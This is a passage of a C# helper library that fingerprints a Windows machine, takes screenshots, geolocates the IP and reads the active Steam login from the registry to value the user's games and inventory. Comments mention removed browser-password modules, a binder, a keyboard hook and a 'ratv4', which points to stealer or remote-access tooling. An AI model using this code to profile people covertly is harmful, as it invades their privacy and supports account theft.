using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Serialization;



//_ System.Management and Device.HWID, Device.OS, Device.Antiviruses removed.

//_ Browsers, NetFile Libraries Removed

//_ Disabled Warnings For Unsafe Serialization/Deserialization For Some Libraries

//_ Disabled Nullable Warnings For Some Libraries




//   -    TIPS FOR EFFICIENCY AND READABILITY

//! use "is null" or "is not null" instead of "== null" or "!= null"

//! use "decimal" istead of "double" in money operations
//! use "Array.Empty<T>()" instead of "null" or "new T[0]" or "new T[] { }"
//! use "Task" instead of "Thread"

//! use range and index operators => "value[0..^1]" instead of "Substring()" or "Remove()", use "value[^1]" instead of "value[value.Length - 1]"

//! use "(T)variable" instead of  "variable as T" if variable type definitely known
//! use "value.GetType() == typeof(T)" to compare types

//! use "Predicate<T>" to create bool returning functions instead of "Func<T, bool>"

//! use "T Property => _property ??= GetValue();" to assign time taking property in only first call

//! use types aliases => "string" or "int" istead of class names => "String" or "Int32"
//! use singular => ("public enum Option") naming on enums instead of plural => ("public enum Options")
//! use "string.Empty" instead of "" to prevent confision

//!   - use Linq methods instead of loops:
//! "enumerable.Where(v => true)"
//! "enumerable.Cast<T>()"
//! "enumerable.Select(v => v)"
//! "enumerable.Any(v => true)"
//! "enumerable.All(v => true)"
//! "enumerable.Count(v => true)"
//! "enumerable.Sum(v => int)"
//! "enumerable.FirstOrDefault(v => true)" instead of "enumerable.Find(v => true)" just for readability 
//! "enumerable.First(v => true)"
//! "enumerable.SingleOrDefault(v => true)"
//! "enumerable.Single(v => true)"
//! "enumerable.OrderBy(v => var)"
//! "enumerable.OrderByDescending(v => var)"
//! "orderedEnumerable.ThenBy(v => var)"
//! "orderedEnumerable.ThenByDescending(v => var)"
//! "enumerable.GroupBy(v => var)"
//! "enumerable.ToLookup(v => key)[key]"
//! "Enumerable.Range(1, 10)"





//! better "using" for idisposables
//! ?? yerine bazen ??= kullan, -=, *= vs..
//! pascal case, etc.. naming...

//! LINQ's Expression<Func<>> (kesin kullanılmalı değil, araştır)
//! eventlerde EventHandler, eventargs yoksa eventargs.Empty yollamak en yaygını... ( araştır )
//! string == string yerine string.Equals(string) olabilir throw null dan kaçınmak için String.Equals(string, string) olabilir...

// thread safe ConcurrentDictionary, cancellation token gibi şeyleri öğren. 

// tcp de vs. start gibi şeyler void değilde bool döndürebilir başarılıysa true...

// Registry gibi IDisposeble şeylerin dispose edilmediği var

// database işlemleri vs. task olmalı ve yeni bi işleme başlarken diğer bütün taskların bitmesini beklemeli

// Internet classında static IsConnected() methodu yap httpClient la

// private field lar _underscore olmalı

// normalde bekleten prop olmaz, Async Method la değiştirilmeli

// ratv4 için geliştirdiklerimi buraya uygula

// better file path for NetFile, Binder, database outputs etc..

// Genel classlardaki event argları vs. private yapma (Keyboard.Hook.EventArgs ??)
// setleri private set yap yada hiç set olmasın
// fieldları property(gerekirse) ve static ( gerekirse )

// Overloads, Classify, Enums

// Screenshot Bitmap, Path (App Icon ve Screenshot için)

// Chess classı, chess dispose

// better names, camel-pascal cased

// passwords -> browser

// settersız staticler yerine const

// steamin static olmaması discordun static olması vs. doğrusu ayarlanmalı

// tcp de falan get; set; private olmalı bazıları








#region => -Device

namespace BekoS
{
    public static class Device
    {

        #region Mac

        private static string? _mac;
        public static string Mac => _mac ??= GetMac();

        private static string GetMac()
        {
            string mac = (
                from nic in NetworkInterface.GetAllNetworkInterfaces()
                where nic.OperationalStatus == OperationalStatus.Up
                select nic.GetPhysicalAddress().ToString()
            ).First();

            for (int i = 2; i <= mac.Length - 2; i += 3)
                mac = mac.Insert(i, "-");

            return mac;
        }

        #endregion

        #region OSBits

        public static int OSBits { get; } = Environment.Is64BitOperatingSystem && Environment.Is64BitProcess ? 64 : 32;

        #endregion

        #region UserName

        public static string UserName { get; } = Environment.UserName;

        #endregion

        #region Name

        public static string Name { get; } = Environment.MachineName;

        #endregion

    }
}

#endregion


#region => -Screen

namespace BekoS
{
    public static class Screen
    {
        #region Size

        public static Size Size { get; } = System.Windows.Forms.Screen.GetBounds(Point.Empty).Size;

        #endregion

        #region Width

        public static int Width { get; } = Size.Width;

        #endregion

        #region Heigth

        public static int Heigth { get; } = Size.Height;

        #endregion

        #region Get Screenshot

        public static Bitmap Screenshot(int widthPercent, int heightPercent)
        {
            Bitmap bitmap = new Bitmap(Width, Heigth);

            using (Graphics Graphics = Graphics.FromImage(bitmap))
                Graphics.CopyFromScreen(Point.Empty, Point.Empty, Size);

            if (widthPercent == 100 && heightPercent == 100) return bitmap;

            Bitmap result = new Bitmap(bitmap, new Size(
                bitmap.Width * widthPercent / 100,
                bitmap.Height * heightPercent / 100
                ));

            bitmap.Dispose();
            return result;
        }
        public static Bitmap Screenshot() => Screenshot(100, 100);
        public static Bitmap Screenshot(int sizePercent) => Screenshot(sizePercent, sizePercent);

        #endregion

    }
}

#endregion


#region => -Ip

namespace BekoS
{
    public class IP
    {
        private string? settedIp;

        public IP() { }
        public IP(string Ip) => settedIp = Ip;



        #region Local IP

        private string? _localIP;
        public string? LocalIP => _localIP ??= GetLocalIP();

        private string? GetLocalIP()
        {
            if (settedIp is not null) return null;

            IPAddress[] addrList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
            return addrList[^1].ToString();
        }

        #endregion

        #region External IP / Location

        private string? _externalIP;
        public string ExternalIP { get { SetIpInfo(); return _externalIP!; } }

        private string? _region;
        public string Region { get { SetIpInfo(); return _region!; } }

        private string? _city;
        public string City { get { SetIpInfo(); return _city!; } }

        private string? _timeZone;
        public string TimeZone { get { SetIpInfo(); return _timeZone!; } }

        private string? _postal;
        public string Postal { get { SetIpInfo(); return _postal!; } }

        private string? _coordinates;
        public string Coordinates { get { SetIpInfo(); return _coordinates!; } }

        private string? _connection;
        public string Connection { get { SetIpInfo(); return _connection!; } }

        private string? _country;
        public string Country { get { SetIpInfo(); return _country!; } }


        private void SetIpInfo()
        {
            if (_externalIP is not null) return;

            string url = settedIp is null ? "https://ipinfo.io/json" : $"https://ipinfo.io/{settedIp}/json";

            string json;
            using (HttpClient httpClient = new HttpClient()) json = httpClient.GetStringAsync(url).Result;

            _externalIP = JsonElement<string>(json, "ip");
            _region = JsonElement<string>(json, "region");
            _city = JsonElement<string>(json, "city");
            _timeZone = JsonElement<string>(json, "timezone");
            _postal = JsonElement<string>(json, "postal");
            _coordinates = JsonElement<string>(json, "loc");
            _connection = JsonElement<string>(json, "org");

            _country = new RegionInfo(JsonElement<string>(json, "country")!).EnglishName;
        }

        #endregion


        #region Utilities

        #region Json Element

        public static T? JsonElement<T>(string Json, string Element)
        {
            string Result = Json;
            string[] Notation = Element.Split('.');

            #region Methods

            var GetString = new Func<string, char, string>((string JsonValue, char Quote) =>
            {
                return Regex.Match(JsonValue[1..], $@"((\\{Quote})|[^{Quote}])*").Value;
            });

            var GetOther = new Func<string, string>((string JsonValue) =>
            {
                return Regex.Match(JsonValue, @"([\w.,]+)(,?)").Groups[0].Value;
            });

            var GetArray = new Func<string, char, string>((string JsonValue, char OpenBracket) =>
            {
                char Bracket = OpenBracket == '{' ? '}' : ']';
                foreach (char Quote in new char[] { '"', '\'', '`' })
                {
                    MatchCollection Matches = new Regex($@"{Quote}((\\{Quote})|[^{Quote}])*{Quote}").Matches(JsonValue);
                    foreach (Match Match in Matches)
                    {
                        string Found = Match.Value;

                        string Replaced = Found.Replace("S-CloseBracket-S", Bracket.ToString());
                        Replaced = Replaced.Replace(Bracket.ToString(), "S-CloseBracket-S");

                        Replaced = Replaced.Replace("S-OpenBracket-S", OpenBracket.ToString());
                        Replaced = Replaced.Replace(OpenBracket.ToString(), "S-OpenBracket-S");

                        JsonValue = JsonValue.Replace(Found, Replaced);
                    }
                }
                // Change All Brackets In String

                int depth = 1;
                int searchIndex = 0;
                while (true)
                {
                    int indexBracketOpen = JsonValue.IndexOf(OpenBracket, searchIndex + 1);
                    int indexBracketClose = JsonValue.IndexOf(Bracket, searchIndex + 1);
                    depth += indexBracketOpen < indexBracketClose && indexBracketOpen != -1 ? 1 : -1;

                    searchIndex = indexBracketOpen < indexBracketClose && indexBracketOpen != -1 ? indexBracketOpen : indexBracketClose;

                    if (depth == 0) break;
                }
                JsonValue = JsonValue[..(searchIndex + 1)];
                // Calculate Brackets

                JsonValue = JsonValue.Replace("S-CloseBracket-S", Bracket.ToString());
                JsonValue = JsonValue.Replace("S-OpenBracket-S", OpenBracket.ToString());
                // Replace Brackets Back

                return JsonValue;
            });

            #endregion

            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                Element = Regex.Match(Result, $@"""{Notation[Layer]}""[\s\n]*:[\s\n]*").Value;
                if (Element == string.Empty) return default;

                string Value = Result[(Result.IndexOf(Element) + Element.Length)..];
                char Type = Value[0];

                // If Element Is  ->  Int | Bool | Null
                if (Char.IsLetterOrDigit(Type)) Result = GetOther(Value);

                // If Element Is  ->  Array  
                else if (Regex.IsMatch(Type.ToString(), @"[{[]")) Result = GetArray(Value, Type);

                // If Element Is  ->  String
                else Result = GetString(Value, Type);
            }

            #region Convert And Return

            if (typeof(T).IsArray)
            {
                Result = Result[1..^1];
                List<string> Items = new List<string>();
                while (true)
                {
                    Result = Result.Trim();
                    if (Result == string.Empty) break;
                    if (Result[0] == ',') Result = Result[1..].Trim();

                    string Item = GetArray(Result, Result[0]);
                    Items.Add(Item);

                    Result = Result[Item.Length..];
                }

                string StartDocument;
                string TypeAlias;
                using (StringWriter StringWriter = new StringWriter())
                {
                    XmlSerializer XmlSerializer = new XmlSerializer(typeof(T));

                    XmlSerializer.Serialize(StringWriter, null);

                    string Serialized = StringWriter.ToString();
                    StartDocument = Serialized[..(Serialized.IndexOf("?>") + 2)];
                    Serialized = Serialized[(Serialized.IndexOf("?>") + 2)..];
                    TypeAlias = Regex.Match(Serialized, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                }
                // Get TypeAlias

                string ArrayXml = string.Empty;
                Type ItemType = typeof(T).GetElementType()!;
                XmlSerializer ItemSerializer = new XmlSerializer(ItemType);
                foreach (string Item in Items)
                    using (StringWriter StringWriter = new StringWriter())
                    {
                        ItemSerializer.Serialize(StringWriter, Convert.ChangeType(Item, typeof(T).GetElementType()!));

                        string Serialized = StringWriter.ToString();
                        ArrayXml += Serialized[(Serialized.IndexOf("?>") + 2)..];
                    }
                // Serialize Items

                ArrayXml = StartDocument + $"<{TypeAlias}>" + ArrayXml + $"</{TypeAlias}>";
                using (StringReader StringReader = new StringReader(ArrayXml))
                {
                    XmlSerializer XmlSerializer = new XmlSerializer(typeof(T));
                    object? Item = XmlSerializer.Deserialize(StringReader);

                    return (T?)Item;
                }
                // Deserialize Array
            }
            // If Array

            return (T)Convert.ChangeType(Result, typeof(T));
            // If Not Array
            #endregion
        }

        #endregion

        #endregion

    }

}

#endregion



// account id vs..
// vanity url
//vac, game bans etc..
//background image
//xp
//badges
//groups
//friends
//whish list
//status

// applerde is_free olmayan ama price_overview'i olmayanlarda package lardan hesaplama
// appleri kaydetip, aynı app için tekrar siteye request göndermeme (idden kontrol) ( private static steam fieldı olabilir )
// price larda tr, vs ye göre değişme
// items, account, props for app
// item, app, game icon

// null değil empty array dönmeli

#region => -Steam

namespace BekoS
{

    public class Steam
    {

        private string ApiKey;
        public Steam(string ApiKey) => this.ApiKey = ApiKey;



        #region Get Paths

        public static string? GetSteamPath() =>
            Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam")?.GetValue("SteamPath")?.ToString()?.Replace("/", "\\");


        public static string? GetUserDataPath()
        {
            string? steamPath = GetSteamPath();
            return steamPath is null ? null : steamPath + "\\userdata";
        }

        #endregion

        #region Get Curent Accounts

        public Account[] GetCurrentAccounts()
        {
            string? userDataPath = GetUserDataPath();
            if (userDataPath is null) return Array.Empty<Account>();

            DirectoryInfo userDataFolderInfo = new DirectoryInfo(userDataPath);
            DirectoryInfo[] userFolderInfos = userDataFolderInfo.GetDirectories();

            List<string> steamIds = new List<string>();
            foreach (DirectoryInfo userFolderInfo in userFolderInfos)
            {
                string accountId = userFolderInfo.Name;
                if (!int.TryParse(accountId, out _)) continue;

                string? steamId = AccountIdToSteamId(accountId);
                if (steamId is null) continue;

                steamIds.Add(steamId);
            }

            if (steamIds.Count == 0) return Array.Empty<Account>();

            Account[] accounts = GetAccountByID(steamIds.ToArray());

            if (accounts.Length == 0) return Array.Empty<Account>(); ;

            accounts =
                accounts.OrderByDescending(acc => acc.Level)
                .ThenBy(acc => acc.Name)
                .ThenBy(acc => acc.CreationDate)
                .ToArray();

            return accounts;
        }

        #endregion

        #region Get Active Account

        public ActiveAccount? GetActiveAccount()
        {
            string? accountId = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam\ActiveProcess")?.GetValue("ActiveUser")?.ToString();
            if (accountId is null) return null;
            string? steamId = AccountIdToSteamId(accountId);
            if (steamId is null) return null;

            Account? account = GetAccountByID(steamId);
            if (account is null) return null;


            string username = ToTitle(Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam")?.GetValue("AutoLoginUser")?.ToString()!);
            string language = ToTitle(Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam")?.GetValue("Language")?.ToString()!);

            ActiveAccount activeAccount = new ActiveAccount(
                ApiKey,

                account.Name,
                account.RealName,
                account.Age,
                account.CreationDate,
                account.Country,
                account.AvatarURL,
                account.ProfileURL,
                account.SteamID,

                username,
                language
                );

            return activeAccount;
        }

        #endregion


        #region Concrete

        #region Account

        public class Account
        {
            public string Name { get; }
            public string? RealName { get; }
            public double Age { get; }
            public DateTime CreationDate { get; }
            public string? Country { get; }
            public string AvatarURL { get; }
            public string ProfileURL { get; }
            public string SteamID { get; }
            public double Hours => Library.TotalHours;
            public int AppCount => Library.AppCount;
            public Library Library { get; }
            public Inventory Inventory { get; }


            private int _level = -2;
            public int Level => _level != -2 ? _level : (_level = GetLevel());



            private string ApiKey;
            public Account(string ApiKey, string Name, string? RealName, double Age, DateTime CreationDate, string? Country, string AvatarURL, string ProfileURL, string SteamID)
            {
                this.ApiKey = ApiKey;
                this.Name = Name;
                this.RealName = RealName;
                this.Age = Age;
                this.CreationDate = CreationDate;
                this.Country = Country;
                this.AvatarURL = AvatarURL;
                this.ProfileURL = ProfileURL;
                this.SteamID = SteamID;

                Library = new Library(ApiKey, this);
                Inventory = new Inventory(this);
            }


            private int GetLevel()
            {
                string response;
                using (HttpClient httpClient = new HttpClient())
                {
                    response = httpClient.GetStringAsync(
                        $"http://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key={ApiKey}&steamid={SteamID}"
                        ).Result;
                }

                return response.Contains("player_level") ? JsonElement<int>(response, "player_level") : -1;
            }

        }

        #endregion

        #region Active Account

        public class ActiveAccount : Account
        {
            public string Username { get; }
            public string Language { get; }

            public ActiveAccount(string ApiKey, string Name, string? RealName, double Age, DateTime CreationDate, string? Country, string AvatarURL,
                string ProfileURL, string SteamID, string Username, string Language) :
                base(ApiKey, Name, RealName, Age, CreationDate, Country, AvatarURL, ProfileURL, SteamID)
            {
                this.Username = Username;
                this.Language = Language;
            }
        }

        #endregion

        #region Library

        public class Library
        {
            public Account Account { get; }


            private App[] _apps = Array.Empty<App>();
            public App[] Apps { get { SetApps(); return _apps; } }

            private double _hours = -2;
            public double TotalHours { get { SetApps(); return _hours; } }

            private int _appCount;
            public int AppCount { get { SetApps(); return _appCount; } }

            private decimal _totalPrice = -2;
            public decimal TotalPrice { get { SetPrices(); return _totalPrice; } }

            private decimal _totalPriceWithDiscounts = -2;
            public decimal TotalPriceWithDiscounts { get { SetPrices(); return _totalPriceWithDiscounts; } }


            private string ApiKey;
            public Library(string ApiKey, Account account)
            {
                this.ApiKey = ApiKey;
                Account = account;
            }


            private void SetApps()
            {
                if (_hours != -2) return;

                string response;
                using (HttpClient httpClient = new HttpClient())
                {
                    response = httpClient.GetStringAsync(
                        $"http://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?include_played_free_games=true&key={ApiKey}&steamid={Account.SteamID}"
                        ).Result;
                }

                _appCount = response.Contains("game_count") ? JsonElement<int>(response, "game_count") : -1;

                _hours = -1;
                if (_appCount < 1) return;
                // If Games Not Exists Or Not Found Return

                string[]? appJsons = JsonElement<string[]>(response, "games");
                if (appJsons is null) return;

                double totalHours = 0;
                List<App> apps = new List<App>();
                foreach (string appJson in appJsons)
                {
                    string id = JsonElement<string>(appJson, "appid")!;
                    double hour = Math.Round(JsonElement<int>(appJson, "playtime_forever") / 60.0, 1, MidpointRounding.AwayFromZero);

                    totalHours += hour;

                    App app = new App(id, hour);
                    apps.Add(app);
                }

                _hours = Math.Round(totalHours, 1, MidpointRounding.AwayFromZero);
                _apps = apps.ToArray();
            }

            private void SetPrices()
            {
                if (_totalPrice != -2) return;
                SetApps();

                if (_appCount < 1)
                {
                    _totalPrice = _appCount;
                    _totalPriceWithDiscounts = _appCount;
                    return;
                }

                string gameIds = string.Join(",", _apps.Select(app => app.ID));

                string response;
                using (HttpClient httpClient = new HttpClient())
                {
                    response = Encoding.UTF8.GetString(httpClient.GetByteArrayAsync(
                        $"https://store.steampowered.com/api/appdetails?&appids={gameIds}&cc=tr&filters=price_overview"
                        ).Result);
                }

                if (!response.Contains("price_overview"))
                {
                    _totalPrice = 0;
                    _totalPriceWithDiscounts = 0;
                    return;
                }

                string[] initials = BetweenAsArray(response, "\"initial\":", ",");
                string[] finals = BetweenAsArray(response, "\"final\":", ",");

                int totalInitial = 0;
                int totalFinals = 0;
                for (int i = 0; i < initials.Length; i++)
                {
                    totalInitial += int.Parse(initials[i]);
                    totalFinals += int.Parse(finals[i]);
                }

                _totalPrice = Math.Round((decimal)(totalInitial / 100.0), 2, MidpointRounding.AwayFromZero);
                _totalPriceWithDiscounts = Math.Round((decimal)(totalFinals / 100.0), 2, MidpointRounding.AwayFromZero);
            }

        }

        #endregion

        #region Inventory

        public class Inventory
        {
            public Account Account { get; }


            private Item[] _items = Array.Empty<Item>();
            public Item[] Items { get { SetItems(); return _items; } }

            private int _itemCount = -2;
            public int ItemCount { get { SetItems(); return _itemCount; } }

            private decimal _totalPrice = -2;
            public decimal TotalPrice { get { SetPrices(); return _totalPrice; } }


            public Inventory(Account account) => Account = account;


            private void SetItems()
            {
                if (_itemCount != -2) return;

                List<App> apps = Account.Library.Apps.ToList();
                apps.Add(new App("753", 0));
                // 753 Is Default Steam Inventory ID

                List<Item> items = new List<Item>();
                using (HttpClient httpClient = new HttpClient())
                    foreach (App app in apps)
                    {
                        string appId = app.ID;
                        string[] contextIds = appId != "753" ? new string[] { "1", "2" } : new string[] { "6" };

                        foreach (string contextId in contextIds)
                        {
                            string response;
                            try
                            {
                                response = httpClient.GetStringAsync(
                                    $"https://steamcommunity.com/inventory/{Account.SteamID}/{appId}/{contextId}?count=5000"
                                    ).Result;
                            }
                            catch { continue; }

                            if (response == "null")
                            {
                                _itemCount = -1;
                                return;
                            }

                            if (!response.Contains("market_hash_name")) continue;

                            string[] marketHashNames = BetweenAsArray(response, "\"market_hash_name\":\"", "\"");

                            foreach (string marketHashName in marketHashNames)
                            {
                                Item item = new Item(Account, app, marketHashName);
                                items.Add(item);
                            }
                        }
                    }
                _itemCount = items.Count;
                _items = items.ToArray();
            }

            private void SetPrices()
            {
                if (_totalPrice != -2) return;
                SetItems();

                if (_itemCount < 1)
                {
                    _totalPrice = _itemCount;
                    return;
                }

                _totalPrice = _items.Sum(item => item.Price);
            }
        }


        #endregion

        #region App

        public class App
        {
            public double Hour { get; }
            public string ID { get; }


            private string? _name;
            public string? Name { get { SetName(); return _name; } }

            private decimal _price = -2;
            public decimal Price { get { SetName(); return _price; } }

            private decimal _priceWithDiscount = -2;
            public decimal PriceWithDiscount { get { SetName(); return _priceWithDiscount; } }

            private bool _isFree;
            public bool IsFree { get { SetName(); return _isFree; } }

            private bool _isFound = true;
            public bool IsFound { get { SetName(); return _isFound; } }


            public App(string ID, double Hour)
            {
                this.ID = ID;
                this.Hour = Hour;
            }


            private void SetName()
            {
                if (_name is not null) return;

                string response;
                using (HttpClient httpClient = new HttpClient())
                {
                    response = httpClient.GetStringAsync(
                        $"https://store.steampowered.com/api/appdetails?&appids={ID}&cc=tr"
                        ).Result;
                }

                if (!JsonElement<bool>(response, "success"))
                {
                    _name = null;
                    _price = 0;
                    _priceWithDiscount = 0;
                    _isFree = true;
                    _isFound = false;
                    return;
                }

                _name = JsonElement<string>(response, "name");
                _isFree = JsonElement<bool>(response, "is_free");

                decimal price = 0;
                decimal priceWithDiscount = 0;
                if (!_isFree)
                {
                    price = Math.Round((decimal)(JsonElement<int>(response, "initial") / 100.0), 2, MidpointRounding.AwayFromZero);
                    priceWithDiscount = Math.Round((decimal)(JsonElement<int>(response, "final") / 100.0), 2, MidpointRounding.AwayFromZero);
                }

                _price = price;
                _priceWithDiscount = priceWithDiscount;
            }
        }

        #endregion

        #region Item

        public class Item
        {
            public Account Account { get; }
            public App App { get; }

            public string Name { get; }

            private decimal _price = -2;
            public decimal Price { get { SetPrice(); return _price; } }


            public Item(Account account, App app, string name)
            {
                Account = account;
                App = app;

                Name = name;
            }


            private void SetPrice()
            {
                if (_price != -2) return;

                _price = 0;

                string response;
                try
                {
                    using (HttpClient httpClient = new HttpClient())
                    {
                        response = httpClient.GetStringAsync(
                        $"https://steamcommunity.com/market/priceoverview/?currency=9&appid={this.App.ID}&market_hash_name={this.Name}"
                        ).Result;
                    }
                }
                catch { return; }

                string? lowestPrice = JsonElement<string>(response, "lowest_price");
                if (lowestPrice is null) return;

                _price = Decimal.Parse(lowestPrice[..lowestPrice.IndexOf(" ")]);
            }
        }

        #endregion

        #endregion


        #region Utilities

        #region Get Account By Id

        public Account[] GetAccountByID(string[] Accounts)
        {
            List<string> SteamIdList = new List<string>();

            foreach (string Account in Accounts)
            {
                string? SteamID;

                if (Account.Length == 17 && Regex.IsMatch(Account, @"^\d+$"))
                    SteamID = Account;
                // Steam ID

                else if (Regex.IsMatch(Account, @"^(?:https?:\/\/)?steamcommunity\.com\/(?:profiles\/[0-9]{17}|id\/[a-zA-Z0-9].*)$"))
                {
                    string VanityURL = Regex.Match(Account, @"(profiles|id)/(\w+)").Groups[2].Value;
                    SteamID = VanityUrlToSteamId(VanityURL);
                }
                // Profile URL

                else SteamID = VanityUrlToSteamId(Account);
                // Vanity URL

                if (SteamID is not null) SteamIdList.Add(SteamID);
            }
            if (SteamIdList.Count == 0) return Array.Empty<Account>();

            string steamIds = string.Join(",", SteamIdList);
            string Response;
            using (HttpClient httpClient = new HttpClient())
            {
                Response = httpClient.GetStringAsync(
                    $"http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key={ApiKey}&steamids={steamIds}"
                    ).Result;
            }

            string[]? accountInfos = JsonElement<string[]>(Response, "players");
            if (accountInfos is null) return Array.Empty<Account>();

            List<Account> SteamAccounts = new List<Account>();
            foreach (string accountInfo in accountInfos)
            {
                string steamId = JsonElement<string>(accountInfo, "steamid")!;

                string name = JsonElement<string>(accountInfo, "personaname")!;

                string? realName = JsonElement<string>(accountInfo, "realname");

                DateTimeOffset createdTime = DateTimeOffset.FromUnixTimeSeconds(JsonElement<long>(accountInfo, "timecreated"));
                double age = Math.Round((DateTimeOffset.UtcNow - createdTime).Days / 365.2422, 1, MidpointRounding.AwayFromZero);

                DateTime creationDate = createdTime.UtcDateTime;

                string? countryCode = JsonElement<string>(accountInfo, "loccountrycode");
                string? country = countryCode is not null ? new RegionInfo(countryCode).EnglishName : null;

                string avatarUrl = JsonElement<string>(accountInfo, "avatarfull")!;

                string ProfileURL = JsonElement<string>(accountInfo, "profileurl")!;

                Account SteamAccount = new Account(
                    ApiKey,

                    name,
                    realName,
                    age,
                    creationDate,
                    country,
                    avatarUrl,
                    ProfileURL,
                    steamId
                    );

                SteamAccounts.Add(SteamAccount);

            }

            return SteamAccounts.ToArray();
        }
        public Account? GetAccountByID(string Account) { Account[] accounts = GetAccountByID(new string[] { Account }); return accounts.Length == 0 ? null : accounts[0]; }

        #endregion

        #region Vanity Url To SteamId

        private string? VanityUrlToSteamId(string VanityUrl)
        {
            if (VanityUrl.Length == 17 && Regex.IsMatch(VanityUrl, @"^\d+$")) return VanityUrl;

            string Url = $"http://api.steampowered.com/ISteamUser/ResolveVanityURL/v0001/?key={ApiKey}&vanityurl={VanityUrl}&format=json";

            string Data;
            using (HttpClient httpClient = new HttpClient())
                Data = httpClient.GetStringAsync(Url).Result;

            if (JsonElement<string>(Data, "success") != "1") return null;

            return JsonElement<string>(Data, "steamid");
        }

        #endregion

        #region Account Id To SteamId

        private static string? AccountIdToSteamId(string AccountId)
        {
            string? steamId = null;
            string accountIdBinary = Convert.ToString(int.Parse(AccountId), 2);
            string startBinary = "1000100000000000000000001";
            for (int x = 0; x < 10; x++)
            {
                string zeros = new StringBuilder(x).Insert(0, "0", x).ToString();
                string tempSteamId = Convert.ToInt64(startBinary + zeros + accountIdBinary, 2).ToString();

                if (!tempSteamId.StartsWith("7") || tempSteamId.Length != 17) continue;

                steamId = tempSteamId;
                break;
            }
            return steamId;
        }

        #endregion

        #region Json Element

        public static T? JsonElement<T>(string Json, string Element)
        {
            string Result = Json;
            string[] Notation = Element.Split('.');

            #region Methods

            var GetString = new Func<string, char, string>((string JsonValue, char Quote) =>
            {
                return Regex.Match(JsonValue[1..], $@"((\\{Quote})|[^{Quote}])*").Value;
            });

            var GetOther = new Func<string, string>((string JsonValue) =>
            {
                return Regex.Match(JsonValue, @"([\w.,]+)(,?)").Groups[0].Value;
            });

            var GetArray = new Func<string, char, string>((string JsonValue, char OpenBracket) =>
            {
                char Bracket = OpenBracket == '{' ? '}' : ']';
                foreach (char Quote in new char[] { '"', '\'', '`' })
                {
                    MatchCollection Matches = new Regex($@"{Quote}((\\{Quote})|[^{Quote}])*{Quote}").Matches(JsonValue);
                    foreach (Match Match in Matches)
                    {
                        string Found = Match.Value;

                        string Replaced = Found.Replace("S-CloseBracket-S", Bracket.ToString());
                        Replaced = Replaced.Replace(Bracket.ToString(), "S-CloseBracket-S");

                        Replaced = Replaced.Replace("S-OpenBracket-S", OpenBracket.ToString());
                        Replaced = Replaced.Replace(OpenBracket.ToString(), "S-OpenBracket-S");

                        JsonValue = JsonValue.Replace(Found, Replaced);
                    }
                }
                // Change All Brackets In String

                int depth = 1;
                int searchIndex = 0;
                while (true)
                {
                    int indexBracketOpen = JsonValue.IndexOf(OpenBracket, searchIndex + 1);
                    int indexBracketClose = JsonValue.IndexOf(Bracket, searchIndex + 1);
                    depth += indexBracketOpen < indexBracketClose && indexBracketOpen != -1 ? 1 : -1;

                    searchIndex = indexBracketOpen < indexBracketClose && indexBracketOpen != -1 ? indexBracketOpen : indexBracketClose;

                    if (depth == 0) break;
                }
                JsonValue = JsonValue[..(searchIndex + 1)];
                // Calculate Brackets

                JsonValue = JsonValue.Replace("S-CloseBracket-S", Bracket.ToString());
                JsonValue = JsonValue.Replace("S-OpenBracket-S", OpenBracket.ToString());
                // Replace Brackets Back

                return JsonValue;
            });

            #endregion

            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                Element = Regex.Match(Result, $@"""{Notation[Layer]}""[\s\n]*:[\s\n]*").Value;
                if (Element == string.Empty) return default;

                string Value = Result[(Result.IndexOf(Element) + Element.Length)..];
                char Type = Value[0];

                // If Element Is  ->  Int | Bool | Null
                if (Char.IsLetterOrDigit(Type)) Result = GetOther(Value);

                // If Element Is  ->  Array  
                else if (Regex.IsMatch(Type.ToString(), @"[{[]")) Result = GetArray(Value, Type);

                // If Element Is  ->  String
                else Result = GetString(Value, Type);
            }

            #region Convert And Return

            if (typeof(T).IsArray)
            {
                Result = Result[1..^1];
                List<string> Items = new List<string>();
                while (true)
                {
                    Result = Result.Trim();
                    if (Result == string.Empty) break;
                    if (Result[0] == ',') Result = Result[1..].Trim();

                    string Item = GetArray(Result, Result[0]);
                    Items.Add(Item);

                    Result = Result[Item.Length..];
                }

                string StartDocument;
                string TypeAlias;
                using (StringWriter StringWriter = new StringWriter())
                {
                    XmlSerializer XmlSerializer = new XmlSerializer(typeof(T));

                    XmlSerializer.Serialize(StringWriter, null);

                    string Serialized = StringWriter.ToString();
                    StartDocument = Serialized[..(Serialized.IndexOf("?>") + 2)];
                    Serialized = Serialized[(Serialized.IndexOf("?>") + 2)..];
                    TypeAlias = Regex.Match(Serialized, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                }
                // Get TypeAlias

                string ArrayXml = string.Empty;
                Type ItemType = typeof(T).GetElementType()!;
                XmlSerializer ItemSerializer = new XmlSerializer(ItemType);
                foreach (string Item in Items)
                    using (StringWriter StringWriter = new StringWriter())
                    {
                        ItemSerializer.Serialize(StringWriter, Convert.ChangeType(Item, typeof(T).GetElementType()!));

                        string Serialized = StringWriter.ToString();
                        ArrayXml += Serialized[(Serialized.IndexOf("?>") + 2)..];
                    }
                // Serialize Items

                ArrayXml = StartDocument + $"<{TypeAlias}>" + ArrayXml + $"</{TypeAlias}>";
                using (StringReader StringReader = new StringReader(ArrayXml))
                {
                    XmlSerializer XmlSerializer = new XmlSerializer(typeof(T));
